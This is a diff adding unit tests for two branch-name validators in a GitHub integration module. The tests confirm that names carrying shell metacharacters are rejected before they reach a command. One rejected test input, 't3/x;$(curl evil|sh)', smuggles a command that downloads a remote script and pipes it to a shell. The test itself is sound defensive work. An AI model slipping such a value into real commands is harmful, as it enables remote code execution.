@@ -42,6 +42,8 @@ import {
   type Feedback,
   type GitHubError,
   isNotFound,
+  isPlainRefName,
+  isSafeBranchName,
   makeGitHub,
 } from "./github.ts";
 
@@ -4306,6 +4308,24 @@ it.effect(
       }
     }),
 );
+
+describe("the branch-name rules", () => {
+  it("keep a plain ref name safe as one argument to git", () => {
+    for (const name of ["t3code/abc", "feat/x;y", "t3/x`y`"]) assert.isTrue(isPlainRefName(name));
+    for (const name of ["", "-x", "--force", "a b", "a..b", "a\u0001b", "a\tb"]) {
+      assert.isFalse(isPlainRefName(name), JSON.stringify(name));
+    }
+  });
+
+  it("let only an ordinary branch name into a command a session runs", () => {
+    for (const name of ["t3code/abc", "t3/2e8db933", "feat/x_y-z.1"]) {
+      assert.isTrue(isSafeBranchName(name), name);
+    }
+    for (const name of ["", "-x", "a b", "a..b", "feat/x;y", "t3/x`y`", "t3/x;$(curl evil|sh)"]) {
+      assert.isFalse(isSafeBranchName(name), JSON.stringify(name));
+    }
+  });
+});
 
 it.effect("openPullRequestsOnHead refuses an answer it cannot read", () =>
   Effect.gen(function* () {
